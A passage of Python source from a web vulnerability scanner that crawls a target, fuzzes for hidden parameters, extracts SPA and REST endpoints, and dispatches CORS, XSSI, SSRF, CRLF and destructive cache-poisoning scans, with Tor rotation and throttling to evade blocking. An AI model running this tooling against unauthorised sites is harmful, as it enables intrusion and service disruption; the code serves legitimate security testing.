                seen_urls.add(u)
                param_urls.append(u)

        if not _passive_waf_found:
            cb["on_log"](
                "[WAF] Passive detection: no known WAF in crawl traffic "
                "(may be custom/signatureless — will surface in the attack phase)",
                "info")
        cb["on_log"](f"[OK] Found {len(param_urls)} unique URLs with parameters", "info")
    else:
        param_urls = find_param_urls(html, target)
        cb["on_log"](f"Found {len(param_urls)} URLs with parameters on the target page.", "info")

    # v10.87: parameter names observed on the real target (POST body keys from
    # captured XHR, `params.get('x')` in its own JS). These beat a generic
    # wordlist because the site itself told us which inputs it reads — see the
    # _param_wordlist phase, which consumes them as high-priority candidates.
    _xhr_param_hints: Set[str] = set()

    # ── v10.46: authenticated headless-driven crawl (real-DOM, SPA, auth) ──────
    # Default OFF. Když zapnuto, proběhne reálný-DOM crawl (vidí JS odkazy, SPA
    # routy, XHR API, formuláře) a session cookies se propíšou do session_main,
    # takže i HTTP scan fáze běží autentizovaně.
    if headless_crawl and not _cancelled.is_set():
        try:
            _hcres = _run_headless_crawl(
                target, headless_crawl_opts, crawl_auth, cb,
                lambda: _cancelled.is_set())
        except Exception as _hce:
            cb["on_log"](f"[CRAWL] headless crawl failed: {_hce}", "warn")
            _hcres = None
        if _hcres is not None:
            _seen_pg = set(pages)
            for _pg in _hcres.pages:
                if _pg not in _seen_pg:
                    _seen_pg.add(_pg); pages.append(_pg)
            _seen_pu = set(param_urls)
            for _pu in _hcres.param_urls:
                if _pu not in _seen_pu:
                    _seen_pu.add(_pu); param_urls.append(_pu)
            for _fm in _hcres.forms:
                for _fu in (_fm.url, _fm.action):
                    if (_fu and _fu.startswith(("http://", "https://"))
                            and _fu not in _seen_pg):
                        _seen_pg.add(_fu); pages.append(_fu)
                        if "?" in _fu and _fu not in _seen_pu:
                            _seen_pu.add(_fu); param_urls.append(_fu)
            # ── v10.87: merge captured XHR/fetch endpoints into the scan ──
            # The headless crawler records every xhr/fetch request the page
            # makes (method, full URL, POST body keys) — real, live endpoints
            # with real parameter names, observed in a browser. Until now the
            # engine only LOGGED the count and threw them away, so the single
            # richest discovery source in the tool fed nothing. Query-bearing
            # ones become scan targets directly; body keys are surfaced as
            # parameter-name hints for the wordlist phase.
            _api_new = _api_params = 0
            for _ep in (_hcres.api_endpoints or []):
                try:
                    _u = _ascii_safe_url(_ep.url)
                except Exception:
                    _u = _ep.url
                if not _u:
                    continue
                try:
                    if not _hosts_match((urlparse(_u).hostname or "").lower(),
                                        (urlparse(target).hostname or "").lower()):
                        continue
                except ValueError:
                    continue
                if _u not in _seen_pg:
                    _seen_pg.add(_u); pages.append(_u); _api_new += 1
                if "?" in _u and _u not in _seen_pu:
                    _seen_pu.add(_u); param_urls.append(_u); _api_params += 1
                for _bk in (_ep.body_keys or []):
                    if _bk:
                        _xhr_param_hints.add(str(_bk))
            if _api_new or _api_params or _xhr_param_hints:
                cb["on_log"](
                    f"[CRAWL] XHR merge: +{_api_new} endpoints, "
                    f"+{_api_params} with parameters, "
                    f"{len(_xhr_param_hints)} field names from POST bodies", "info")

            # propíš session cookies z authed crawlu do HTTP session
            _napplied = 0
            for _ck in (_hcres.cookies or []):
                try:
                    session_main.cookies.set(
                        _ck.get("name"), _ck.get("value"),
                        domain=_ck.get("domain"), path=_ck.get("path", "/"))
                    _napplied += 1
                except Exception:
                    pass
            cb["on_log"](
                f"[CRAWL] headless merge: +{len(_hcres.pages)} pages, "
                f"+{len(_hcres.param_urls)} param URLs, +{len(_hcres.forms)} forms, "
                f"+{len(_hcres.api_endpoints)} API endpoints, {_napplied} cookies → session "
                f"(auth={_hcres.auth_method}/{_hcres.auth_ok})", "info")

    # ── Scope enforcement ────────────────────────────────────────────────────
    # Odfiltruj externí URL (Google Maps embed, YouTube, analytics, atd.),
    # které find_param_urls vtáhla z iframe src / linků. Testovat externí
    # domény = false positives + porušení scope. Match tolerantně (www.
    # prefix, subdomény targetu).
    target_host = (urlparse(target).hostname or "").lower()
    if target_host and param_urls:
        scoped_urls = []
        out_of_scope = 0
        for u in param_urls:
            u_host = (urlparse(u).hostname or "").lower()
            if _hosts_match(u_host, target_host):
                scoped_urls.append(u)
            else:
                out_of_scope += 1
        if out_of_scope > 0:
            cb["on_log"](f"[!] Scope: filtered out {out_of_scope} external URLs (outside {target_host})", "info")
        param_urls = scoped_urls

    # ── Endpoint deduplication ───────────────────────────────────────────────
    # Web často má tisíce URL se stejnou strukturou parametrů, ale různými
    # hodnotami (např. /clanek?nazev=X&id=Y pro každý článek). Všechny tyto
    # URL používají STEJNÝ endpoint — testovat jich 1500 je plýtvání.
    # Deduplikujeme podle (path, set_of_param_names). Vybíráme první URL
    # z každé skupiny jako reprezentanta.
    # REGRESSION: example.org má 1583 článků → 80 minut scan. Po dedup: 2 endpointy.
    if param_urls:
        endpoint_groups: Dict[Tuple[str, str, Tuple[str, ...]], str] = {}
        skipped_dupes = 0
        for u in param_urls:
            p = urlparse(u)
            qs_keys = tuple(sorted(parse_qs(p.query, keep_blank_values=True).keys()))
            # v10.77: include host — scope keeps in-scope subdomains, so
            # blog.x.com/article?id=1 and shop.x.com/article?id=1 are DISTINCT
            # endpoints; the old host-less key dropped the second one.
            key = (p.netloc, p.path, qs_keys)
            if key not in endpoint_groups:
                endpoint_groups[key] = u
            else:
                skipped_dupes += 1
        dedup_urls = list(endpoint_groups.values())
        if skipped_dupes > 0:
            cb["on_log"](f"Endpoint dedup: {len(param_urls)} URLs → {len(dedup_urls)} unique endpoints (skip {skipped_dupes} duplicates)", "info")
        param_urls = dedup_urls

    # ── v10.14: Parameter wordlist fuzzing ───────────────────────────────────
    # Crawl-based discovery is structurally blind to GET params that nothing
    # in the HTML links to (PHP $_GET['attachment'] read directly). Probe a
    # curated wordlist against param-less / param-poor endpoints, detect which
    # canaries reflect, and feed the live params back into param_urls so the
    # normal scan phases test them. Detection-only; #1 fix for false negatives
    # vs nuclei top-xss-params (estrava /estrava/stara/?attachment= case).
    if _PARAM_WORDLIST_AVAILABLE and param_wordlist and _pw_discover is not None:
        cb["on_phase"]("param_wordlist", {})
        # Build the set of base endpoints to probe. We probe endpoints with
        # FEW existing params (the crawler covered the well-linked ones).
        # Also include the target itself even if it had no params at all.
        pw_seen_paths: Set[Tuple[str, str]] = set()
        pw_candidates: List[str] = []
        for u in list(param_urls) + [target]:
            try:
                pu = urlparse(u)
            except Exception:
                continue
            existing_n = len(parse_qs(pu.query, keep_blank_values=True))
            if not _pw_needs(u, existing_n):
                continue
            # Dedup probe targets by (path) — one probe per distinct endpoint
            pkey = (pu.netloc, pu.path)
            if pkey in pw_seen_paths:
                continue
            pw_seen_paths.add(pkey)
            pw_candidates.append(u)

        # Hard cap on endpoints probed (cost control).
        # v10.14 fix: lowered 25→8. With 12 batches/endpoint that was
        # up to ~300 extra requests fired right after the crawler —
        # even throttled that's an aggressive volume spike that gets
        # the scanner blocked. 8 endpoints × 6 batches = ~48 requests
        # max, spread by realistic_request_delay. Bounty preset users
        # who want deeper coverage can still rely on the per-endpoint
        # reflection hits being fed back into the normal pipeline.
        _PW_MAX_ENDPOINTS = 8
        pw_candidates = pw_candidates[:_PW_MAX_ENDPOINTS]

        # v10.87: mine parameter NAMES straight out of the target's own HTML +
        # inline JS (`searchParams.get('x')`, `<input name=x>`, `?x=` literals)
        # plus the POST body keys captured from XHR. These are inputs the app
        # demonstrably reads, so they are probed BEFORE the generic wordlist and
        # carry a far higher hit rate. This is the parameter-surface discovery a
        # URL-only crawler (Katana et al.) structurally cannot do.
        _pw_target_names: List[str] = []
        try:
            _mined = _pw_extract_names(html or "") if _pw_extract_names else []
            _seen_nm: Set[str] = set()
            for _nm in list(_xhr_param_hints) + list(_mined):
                if _nm and _nm not in _seen_nm:
                    _seen_nm.add(_nm)
                    _pw_target_names.append(_nm)
        except Exception:
            _pw_target_names = list(_xhr_param_hints)

        if pw_candidates:
            try:
                _pw_wl = _pw_size() if _pw_size else len(_PW_PARAMS)
            except Exception:
                _pw_wl = len(_PW_PARAMS)
            cb["on_log"](
                f"[PWL] Wordlist fuzzing: {_pw_wl} param names × "
                f"{len(pw_candidates)} endpoint(s)"
                + (f" (+{len(_pw_target_names)} z cíle, probovány první)"
                   if _pw_target_names else ""), "info")

            def _pw_fetch(probe_url: str) -> Optional[str]:
                """Fetch via perform_request so the wordlist probe
                INHERITS the scan's anti-detection: behavioural delay
                (realistic_request_delay), Tor rotation, sticky per-host
                UA. v10.14 fix: was calling session_main.get() directly,
                which bypassed all throttling and fired up to ~300
                requests back-to-back at full speed → targets blocked
                the scanner within seconds of the crawler finishing."""
                if _cancelled.is_set():
                    return None
                try:
                    rp = perform_request(
                        session_main, probe_url, timeout,
                        follow_redirects)
                    if rp is None or rp is _REQUEST_FAILED:
                        return None
                    if not hasattr(rp, "text"):
                        return None
                    return rp.text or ""
                except Exception:
                    return None

            pw_new_urls = 0
            pw_total_params = 0
            _pw_existing = set(param_urls)
            for base in pw_candidates:
                if _cancelled.is_set():
                    break
                try:
                    res = _pw_discover(base, _pw_fetch,
                                       batch_size=25, max_batches=6,
                                       extra_params=_pw_target_names or None)
                except Exception as e:
                    cb["on_log"](
                        f"[PWL] discover failed on {base}: "
                        f"{type(e).__name__}", "debug")
                    continue
                refl = res.get("reflected_params") or []
                purl = res.get("param_url")
                if refl and purl:
                    if purl not in _pw_existing:
                        _pw_existing.add(purl)
                        param_urls.append(purl)
                        pw_new_urls += 1
                    pw_total_params += len(refl)
                    cb["on_log"](
                        f"[PWL] {base} → {len(refl)} hidden param(s): "
                        f"{', '.join(refl[:8])}"
                        f"{' …' if len(refl) > 8 else ''}", "info")

            if pw_new_urls:
                cb["on_log"](
                    f"[PWL] Discovered {pw_total_params} hidden reflected "
                    f"params across {pw_new_urls} endpoint(s) — added to "
                    f"scan queue", "info")
            else:
                cb["on_log"](
                    "[PWL] No hidden reflected params found", "info")
    elif not _PARAM_WORDLIST_AVAILABLE and param_wordlist:
        cb["on_log"](
            "Param wordlist module: _param_wordlist.py unavailable "
            "(import failed) — phase skipped", "info")

    # ── Limity ────────────────────────────────────────────────────────────────
    if limit_urls:
        param_urls = param_urls[:limit_urls]
        cb["on_log"](f"URL count limited to {len(param_urls)} (--limit-urls).", "info")

    _spa_fallback_used = False  # tracking for end-of-scan tip
    if not param_urls:
        # ── SPA route fallback (v10.2 + REST endpoints + param hints) ──
        # Static HTML crawler found 0 URLs with params — typical for SPAs
        # (Angular/React/Vue). Strategy:
        #   1. Detect SPA framework + extract hash routes from JS bundles
        #   2. Extract REAL REST API endpoints from JS bundles
        #      (/api/X, /rest/X, /v1/X) — these are direct HTTP endpoints
        #      with real query strings and the actual XSS attack surface
        #   3. For routes that match well-known patterns (search, track-result,
        #      redirect), append probe query params (?q=, ?id=, ?to=)
        if _SPA_EXTRACTOR_AVAILABLE and not _cancelled.is_set():
            try:
                cb["on_log"](
                    "[SPA] No params via static HTML — checking for SPA routing...",
                    "info"
                )
                # Refetch HTML if we lost it
                spa_html = html or ""
                if not spa_html:
                    try:
                        r = session_main.get(
                            target, timeout=timeout,
                            allow_redirects=follow_redirects
                        )
                        if r is not None and r.status_code < 400:
                            spa_html = r.text or ""
                    except Exception:
                        pass

                # Fetch external JS bundles — that's where everything lives
                spa_js_sources: Dict[str, str] = {}
                if _sjs_external_urls and spa_html:
                    ext_urls = _sjs_external_urls(spa_html, base_url=target)
                    MAX_SPA_BUNDLES = 15
                    for js_url in ext_urls[:MAX_SPA_BUNDLES]:
                        try:
                            jr = session_main.get(
                                js_url, timeout=timeout,
                                allow_redirects=True
                            )
                            if jr is not None and jr.status_code < 400:
                                spa_js_sources[js_url] = jr.text or ""
                        except Exception as _je:
                            _swallow(_je, f"SPA JS fetch {js_url}")
                            continue

                # 1. SPA framework detection + hash routes
                fw, mode, spa_route_urls = _spa_discover(
                    target=target,
                    html=spa_html,
                    js_sources_dict=spa_js_sources,
                )

                # 2. REST endpoint extraction (the real attack surface)
                from _spa_route_extractor import (
                    extract_rest_endpoints,
                    build_rest_endpoint_urls,
                    add_param_hints_to_urls,
                )
                rest_endpoints: Set[str] = set()
                for js_url, js_src in spa_js_sources.items():
                    for ep in extract_rest_endpoints(js_src):
                        rest_endpoints.add(ep)
                rest_urls = build_rest_endpoint_urls(target, sorted(rest_endpoints))

                # 3. Add param hints to SPA route URLs (search → ?q=, etc.)
                spa_route_urls_hinted = add_param_hints_to_urls(spa_route_urls or [])

                if fw:
                    cb["on_log"](
                        f"[SPA] Detected: {fw} ({mode} routing) — "
                        f"{len(spa_route_urls or [])} routes, "
                        f"{len(rest_endpoints)} REST endpoints from JS bundles",
                        "info"
                    )

                # Combine all candidate URLs: REST endpoints first (highest
                # value — real APIs with real params), then SPA routes with
                # param hints
                MAX_SPA_URLS = 80
                combined_urls: List[str] = []
                seen_combined: Set[str] = set()
                for u in rest_urls:
                    if u not in seen_combined:
                        seen_combined.add(u)
                        combined_urls.append(u)
                for u in spa_route_urls_hinted:
                    if u not in seen_combined:
                        seen_combined.add(u)
                        combined_urls.append(u)
                if len(combined_urls) > MAX_SPA_URLS:
                    cb["on_log"](
                        f"[SPA] capping at {MAX_SPA_URLS} URLs "
                        f"(of {len(combined_urls)})", "info"
                    )
                    combined_urls = combined_urls[:MAX_SPA_URLS]

                spa_param_urls: List[str] = []
                spa_seen: Set[str] = set()
                spa_pages: List[str] = []
                fetched_count = 0

                for idx, su in enumerate(combined_urls):
                    if _cancelled.is_set():
                        break
                    cb["on_progress"](idx + 1, len(combined_urls))
                    # Add URL itself if it has a query string — engine will
                    # probe these for reflection
                    parsed_su = urlparse(su)
                    if parsed_su.query:
                        if su not in spa_seen:
                            spa_seen.add(su)
                            spa_param_urls.append(su)
                    # Cap fetched count to avoid hammering the target
                    if fetched_count >= 30:
                        continue
                    try:
                        r = session_main.get(
                            su, timeout=timeout,
                            allow_redirects=follow_redirects
                        )
                        if r is None or r.status_code >= 400:
                            continue
                        fetched_count += 1
                        spa_pages.append(su)
                        page_html = r.text or ""
                        for u in find_param_urls(page_html, su):
                            if u not in spa_seen:
                                spa_seen.add(u)
                                spa_param_urls.append(u)
                    except Exception:
                        continue

                # Add discovered SPA pages to global pages list so static
                # analysis phases see them
                for p in spa_pages:
                    if p not in pages:
                        pages.append(p)
                # Also feed hash URLs (with hints) into pages — DOM v6 needs
                # each hash route as a distinct probe target, not just the
                # ones we managed to fetch. /#/search?q=test, /#/track-result
                # ?id=test etc. are exactly the URLs Angular renders different
                # views for, so DOM v6 will navigate Chromium to each one
                # and watch for hash-source → innerHTML sinks.
                for u in spa_route_urls_hinted:
                    if "?" in u and u not in pages:
                        pages.append(u)

                if spa_param_urls:
                    param_urls = spa_param_urls
                    _spa_fallback_used = True
                    cb["on_log"](
                        f"[SPA] Discovered {len(param_urls)} testable URLs "
                        f"({len(rest_urls)} REST + "
                        f"{len(spa_route_urls_hinted)} SPA-with-hints) "
                        f"from {len(spa_pages)} fetched pages — continuing scan",
                        "info"
                    )
                    # SPAs jsou obvykle node.js dev servery (Juice Shop, Vite,
                    # Express) — single-threaded event loop snadno spadne pod
                    # high request rate. Snížíme workers + zvýšíme sleep pro
                    # ohleduplnější scan.
                    if workers > 5:
                        old_workers = workers
                        workers = 5
                        cb["on_log"](
                            f"[SPA] throttling workers {old_workers}→5 "
                            f"(SPA target — dev server detected)", "info"
                        )
                    if sleep_between < 0.05:
                        sleep_between = 0.05
                        cb["on_log"](
                            f"[SPA] sleep_between→0.05s (rate limit for SPA)",
                            "info"
                        )
                elif fw:
                    cb["on_log"](
                        f"[SPA] {fw} detected but no testable URLs after "
                        f"endpoint+hint extraction — exiting", "info"
                    )
                else:
                    cb["on_log"](
                        "[SPA] No SPA framework detected", "info"
                    )
            except Exception as e:
                cb["on_log"](
                    f"[SPA] Route discovery failed: "
                    f"{type(e).__name__}: {e}", "warn"
                )

    # v10.59: percent-encode any non-ASCII in the discovered URLs (real sites
    # expose non-ASCII paths — Czech listings like '.../pozemek_..._m²_...').
    # Doing it once here means EVERY downstream phase gets ASCII-safe URLs, so a
    # raw non-ASCII URL can never crash a phase (or the scan) on the wire and
    # those URLs actually get scanned. Behaviour-preserving (server decodes %XX).
    pages = [_ascii_safe_url(u) for u in pages]
    param_urls = [_ascii_safe_url(u) for u in param_urls]

    # v10.16: crawl + param discovery hotové → checkpoint (pokud ještě není
    # z resume). Uloží pages + finální param_urls, ať se po pádu crawl
    # neopakuje (typicky nejdražší fáze).
    if _ckpt is not None and not _crawl_from_ckpt:
        try:
            _ckpt.mark_phase_done("crawl", {
                "pages": list(pages),
                "param_urls": list(param_urls),
            })
        except Exception:
            pass

    if not param_urls:
        # v10.16: řada fází nepotřebuje query-param URL — path/cookie sken
        # (cesta/hlavičky), static_js + library-CVE audit (JS soubory + HTML
        # markery). Pokud je cokoli z toho zapnuté, nekonči; jen přeskoč
        # param-based fáze a pokračuj k těm page-based.
        # v10.20 (fix — tichý FN na cílech bez parametrů): guard dřív
        # vynechával VŠECHNY hlavičkové / JS- / endpoint-based fáze, které
        # parametr nepotřebují (destructive cache/host/stored-hdr, CORS,
        # CRLF, XSSI, SSRF, open-redirect, proto-pollution, DOM clobbering,
        # Trusted Types, header scan). Na cíli bez query-parametrů (homepage,
        # /forgot-password, SPA, login) se sken ukončil dřív, než se k nim
        # dostal — i když je uživatel explicitně zapnul. Nově je všechny
        # uvádíme v podmínce, takže dostanou šanci proti seed targetu.
        if enable_path_scan or enable_cookie_scan or static_js or \
                enable_jsonp_scan or enable_svg_scan or enable_graphql_scan or \
                destructive_enabled or cors_scan_enabled or \
                crlf_scan_enabled or xssi_scan_enabled or \
                open_redirect or proto_pollution or dom_clobbering or \
                trusted_types or ssrf_scan_enabled or enable_header_scan:
            cb["on_log"](
                "No URLs with parameters — continuing with page-based / header "
                "scans (path/cookie/static-JS/CVE/JSONP/SVG/CORS/CRLF/XSSI/"
                "SSRF/open-redirect/proto-pollution/destructive).", "info")
        else:
            cb["on_log"]("No URLs with parameters found. Exiting.", "info")
            return []

    # ── v10.15: Web-vuln scans (CORS/XSSI/SSRF/CRLF) — VŠECHNY za crawlem ──
    # Dřív CORS/XSSI/SSRF běžely před crawlem proti seedu; CRLF byl přesunut
    # už dřív. Teď běží všechny čtyři až tady, v návaznosti na crawl:
    # nejdřív seed (pokud má parametry / je relevantní), pak crawled URL.
    # Smyčka přeskakuje target, takže se seed netestuje dvakrát.
    _MAX_CRAWLED_VULN_URLS = 30
    crawled_vuln_urls = param_urls[:_MAX_CRAWLED_VULN_URLS]

    # v10.86: DOM v6 runs Chromium per page (~1-2s), so it is capped. The cap
    # used to be an invisible hardcoded 25: on a larger site the majority of
    # pages got no DOM analysis at all and the report never mentioned it, which
    # reads as "clean" when it means "not looked at". Default raised to 60 and
    # overridable for deep runs; the phase logs a warning whenever it binds.
    # v10.75: XSSG_DOM_V6_MAX_PAGES=0 (or 'unlimited'/'none'/'all') removes the
    # cap entirely — every crawled page gets DOM analysis. That is still bounded
    # from above by the crawler's max_pages budget (default 200), it is not
    # infinite; but on a big SPA site it can add minutes, so it stays opt-in.
    def _dom_v6_page_cap() -> Optional[int]:
        raw = (os.environ.get("XSSG_DOM_V6_MAX_PAGES", "") or "").strip().lower()
        if raw in ("0", "-1", "unlimited", "none", "all", "inf", "infinite"):
            return None   # None => no cap (analyze every crawled page)
        try:
            v = int(raw or 60)
            return None if v <= 0 else max(1, v)
        except (TypeError, ValueError):
            return 60

    # Seznam reálně zapnutých scannerů — pro log i phase eventy (žádné
    # natvrdo "CRLF/XSSI/SSRF" když část je vypnutá).
    _active_web_vulns = [n for n, en in (
        ("CORS", cors_scan_enabled), ("XSSI", xssi_scan_enabled),
        ("SSRF", ssrf_scan_enabled), ("CRLF", crlf_scan_enabled),
    ) if en]

    # ── Seed-level scany (smyčka níže přeskakuje target) ──
    if _active_web_vulns and not _cancelled.is_set():
        # v10.15: phase event jednou per scanner, tady na začátku web-vuln
        # stage (pokrývá seed i crawled-loop běh) — žádné duplicity.
        for _ph in ("cors", "xssi", "ssrf", "crlf"):
            _en = {"cors": cors_scan_enabled, "xssi": xssi_scan_enabled,
                   "ssrf": ssrf_scan_enabled, "crlf": crlf_scan_enabled}[_ph]
            if _en:
                cb["on_phase"](_ph, {"url": target})
        # CORS na seedu — testuje hlavičky, nepotřebuje query parametry.
        if cors_scan_enabled:
            try:
                for _f in cors_scan(session_main, target, timeout=timeout,
                                    on_log=cb.get("on_log")):
                    cb["on_hit"]({
                        "url": _f["url"], "param": "Origin (HTTP header)",
                        "payload": f"Origin: {_f['evil_origin']}",
                        "context": "cors-misconfiguration",
                        "source": "cors-static", "severity": _f["severity"],
                        "cwe_hint": _f.get("cwe", "CWE-942"),
                        "cors_finding": _f,
                        "evidence": (f"ACAO={_f['response_acao']} "
                                     f"ACAC={_f['response_acac']}"),
                    })
            except Exception as _ce:
                cb["on_log"](f"[CORS] seed scan failed: {_ce}", "warning")

        # XSSI na seedu — JSONP/JS-parseable, nepotřebuje query parametry.
        if xssi_scan_enabled:
            try:
                for _f in xssi_scan(session_main, target, timeout=timeout,
                                    on_log=cb.get("on_log")):
                    cb["on_hit"]({
                        "url": _f["url"], "param": _f["param"],
                        "payload": _f["payload"], "context": "xssi",
                        "source": "xssi-static", "severity": _f["severity"],
                        "cwe_hint": _f.get("cwe", "CWE-829"),
                        "xssi_finding": _f,
                        "evidence": (f"type={_f['attack_type']} "
                                     f"sensitive={_f.get('sensitive_data_likely')}"),
                    })
            except Exception as _ce:
                cb["on_log"](f"[XSSI] seed scan failed: {_ce}", "warning")

        # SSRF + CRLF na seedu — jen když má seed query parametry (jinak
        # nemají co testovat / jely by proti dummy).
        if urlparse(target).query:
            if ssrf_scan_enabled:
                try:
                    for _f in ssrf_scan(session_main, target, timeout=timeout,
                                        on_log=cb.get("on_log")):
                        cb["on_hit"]({
                            "url": _f["url"], "param": _f["param"],
                            "payload": _f["payload"], "context": "ssrf",
                            "source": "ssrf-static", "severity": _f["severity"],
                            "cwe_hint": _f.get("cwe", "CWE-918"),
                            "ssrf_finding": _f,
                            "evidence": (f"type={_f['attack_type']} "
                                         f"patterns={_f.get('patterns_matched', [])}"),
                        })
                except Exception as _ce:
                    cb["on_log"](f"[SSRF] seed scan failed: {_ce}", "warning")

            if crlf_scan_enabled:
                try:
                    for _f in crlf_scan(session_main, target, timeout=timeout,
                                        on_log=cb.get("on_log")):
                        cb["on_hit"]({
                            "url": _f["url"], "param": _f["param"],
                            "payload": _f["payload"],
                            "context": "crlf-injection", "source": "crlf-static",
                            "severity": _f["severity"],
                            "cwe_hint": _f.get("cwe", "CWE-93"),
                            "crlf_finding": _f,
                            "evidence": (f"header_hit={_f['header_hit_name']} "
                                         f"body_hit={_f['body_hit']}"),
                        })
                except Exception as _ce:
                    cb["on_log"](f"[CRLF] seed scan failed: {_ce}", "warning")

    if crawled_vuln_urls and len(crawled_vuln_urls) > 0 and _active_web_vulns:
        # v10.15: phase eventy už padly jednou nahoře (per scanner). Tady jen
        # log se scannery, které reálně běží v této PARAM-URL smyčce
        # (CRLF/XSSI/SSRF). CORS běží ve vlastní smyčce níže nad crawlovanými
        # STRÁNKAMI (v10.52 — dřív byl jen seed-only, viz fix pod touto smyčkou).
        _loop_vulns = [n for n, en in (
            ("XSSI", xssi_scan_enabled), ("SSRF", ssrf_scan_enabled),
            ("CRLF", crlf_scan_enabled)) if en]
        cb["on_log"](
            f"[VULN] Scanning {len(crawled_vuln_urls)} crawled param "
            f"URLs for {'/'.join(_loop_vulns)}...", "info",
        )
        _cvu_total = len(crawled_vuln_urls)
        for _cvu_idx, _cvu in enumerate(crawled_vuln_urls):
            cb["on_progress"](_cvu_idx + 1, _cvu_total)  # live ETA
            # Skip target URL (already scanned above)
            if _cvu.split("?")[0] == target.split("?")[0]:
                continue
            try:
                if crlf_scan_enabled:
                    _cf = crlf_scan(session_main, _cvu, timeout=timeout)
                    for _f in _cf:
                        cb["on_hit"]({
                            "url": _f["url"], "param": _f["param"],
                            "payload": _f["payload"],
                            "context": "crlf-injection",
                            "source": "crlf-crawled",
                            "severity": _f["severity"],
                            "cwe_hint": "CWE-93",
                            "crlf_finding": _f,
                            "evidence": (
                                f"header_hit={_f['header_hit_name']} "
                                f"body_hit={_f['body_hit']}"
                            ),
                        })
                if xssi_scan_enabled:
                    _xf = xssi_scan(session_main, _cvu, timeout=timeout)
                    for _f in _xf:
                        cb["on_hit"]({
                            "url": _f["url"], "param": _f["param"],
                            "payload": _f["payload"],
                            "context": "xssi", "source": "xssi-crawled",
                            "severity": _f["severity"],
                            "cwe_hint": "CWE-829",
                            "xssi_finding": _f,
                            "evidence": (
                                f"type={_f['attack_type']} "
                                f"sensitive={_f.get('sensitive_data_likely')}"
                            ),
                        })
                if ssrf_scan_enabled:
                    _sf = ssrf_scan(session_main, _cvu, timeout=timeout)
                    for _f in _sf:
                        cb["on_hit"]({
                            "url": _f["url"], "param": _f["param"],
                            "payload": _f["payload"],
                            "context": "ssrf", "source": "ssrf-crawled",
                            "severity": _f["severity"],
                            "cwe_hint": "CWE-918",
                            "ssrf_finding": _f,
                            "evidence": (
                                f"type={_f['attack_type']} "
                                f"patterns={_f.get('patterns_matched', [])}"
                            ),
                        })
            except Exception:
                pass  # individual URL failure — continue

    # ── CORS on crawled/discovered endpoints (v10.52 — recall fix) ───────────
    # FIX: CORS is a per-endpoint *header* misconfig, but historically cors_scan
    # ran ONLY against the seed (homepage). A critical ACAO-reflect +
    # Access-Control-Allow-Credentials:true on a CRAWLED endpoint (the common
    # real-world case, e.g. /api/*) was structurally undetectable — even though
    # the sibling XSSI header scanner already runs on crawled URLs.
    #
    # Coverage note: the crawler's `pages` holds only HTML responses — JSON API
    # endpoints (the prime CORS target) are fetched but dropped as non-HTML. So
    # candidates = crawled HTML pages + param URLs + same-origin links extracted
    # from the seed HTML (catches APIs linked from the landing page). Deduped by
    # scheme+host+path, capped, seed excluded (already scanned above).
    if (cors_scan_enabled and _active_web_vulns and not _cancelled.is_set()):
        _seed_p = urlparse(target)
        # Normalize the path the SAME way the crawler does (empty path -> "/"):
        # a bare-domain target (https://example.com) has path "" while crawled
        # pages hold the normalized "https://example.com/" (path "/"). Without
        # this, the seed key never matches the homepage candidate, so the seed
        # is NOT excluded and the homepage gets CORS-scanned a second time
        # (duplicate finding + a redundant probe batch).
        _cors_seen = {(_seed_p.scheme, _seed_p.netloc, _seed_p.path or "/")}
        _cors_candidates: List[str] = list(pages or []) + list(param_urls or [])
        try:
            # base_host is the bare hostname (no port) — matches _hosts_match /
            # crawl_site convention; passing netloc (with port) silently drops all
            # links on non-standard ports (e.g. local test servers).
            _seed_links, _ = _extract_links(
                html, target, (_seed_p.hostname or "").lower())
            _cors_candidates += [l for l in _seed_links
                                 if urlparse(l).netloc == _seed_p.netloc]
        except Exception:
            pass
        _cors_targets: List[str] = []
        for _pu in _cors_candidates:
            _pp = urlparse(_pu)
            _k = (_pp.scheme, _pp.netloc, _pp.path or "/")
            if _k in _cors_seen:
                continue
            _cors_seen.add(_k)
            _cors_targets.append(_pu)
            if len(_cors_targets) >= _MAX_CRAWLED_VULN_URLS:
                break
        if _cors_targets:
            cb["on_phase"]("cors_crawled", {"endpoints": len(_cors_targets)})
            cb["on_log"](
                f"[CORS] Scanning {len(_cors_targets)} crawled pages for "
                f"CORS misconfiguration...", "info")
        _cors_total = len(_cors_targets)
        for _ci, _cu in enumerate(_cors_targets):
            if _cancelled.is_set():
                break
            cb["on_progress"](_ci + 1, _cors_total)  # live ETA for this phase
            try:
                for _f in cors_scan(session_main, _cu, timeout=timeout):
                    cb["on_hit"]({
                        "url": _f["url"], "param": "Origin (HTTP header)",
                        "payload": f"Origin: {_f['evil_origin']}",
                        "context": "cors-misconfiguration",
                        "source": "cors-crawled", "severity": _f["severity"],
                        "cwe_hint": _f.get("cwe", "CWE-942"),
                        "cors_finding": _f,
                        "evidence": (f"ACAO={_f['response_acao']} "
                                     f"ACAC={_f['response_acac']}"),
                    })
            except Exception:
                pass  # individual URL failure — continue

    # ── v10.15: DESTRUCTIVE testy (PŘESUNUTO za crawl) ───────────────────────
    # Běží až po crawlu + ostatních vuln-scanech, na reálných endpointech.
    # Opt-in jen s autorizací (destructive_enabled). Pokud crawler vypnutý,
    # běží i tak v návaznosti — param_urls je už finalizované.
    # ── v10.15: CORS/XSSI/SSRF PŘESUNUTY za crawl ─────────────────────────────
    # Dřív CORS, XSSI i SSRF běžely TADY (před crawlem) a testovaly jen seed
    # `target`. Stejný problém jako měl CRLF: homepage často nemá zajímavé
    # parametry/endpointy, takže se nic netestovalo. Nově všechny čtyři
    # (CORS/XSSI/SSRF/CRLF) běží až po dokončení crawleru — nejdřív seed,
    # pak nalezené parametrizované URL (viz crawled-vuln blok níže).
    # Pouze pokud uživatel explicitně zaškrtl GUI checkbox + potvrdil
    # autorizační dialog. destructive_enabled flag musí být True.
    if destructive_enabled:
        cb["on_log"](
            "⚠ DESTRUCTIVE TESTING ENABLED — persistent impact possible! "
            "Only authorized targets!", "warning",
        )

        # 1) Cache Poisoning
        try:
            cb["on_phase"]("destructive-cache", {"url": target})
            cache_findings = cache_poisoning_scan(
                session_main, target, timeout=timeout,
                on_log=cb.get("on_log"),
            )
            if cache_findings:
                cb["on_log"](
                    f"[DESTRUCTIVE/cache] Found {len(cache_findings)} "
                    f"poisoning vector(s)!", "warning",
                )
                for f in cache_findings:
                    cb["on_hit"]({
                        "url": f["url"],
                        "param": f"Header: {f['header_injected']}",
                        "payload": f["payload_value"],
                        "context": "cache-poisoning",
                        "source": "destructive-cache",
                        "severity": f["severity"],
                        "cwe_hint": f.get("cwe", "CWE-444"),
                        "destructive_finding": f,
                        "evidence": (
                            f"cache_indicators="
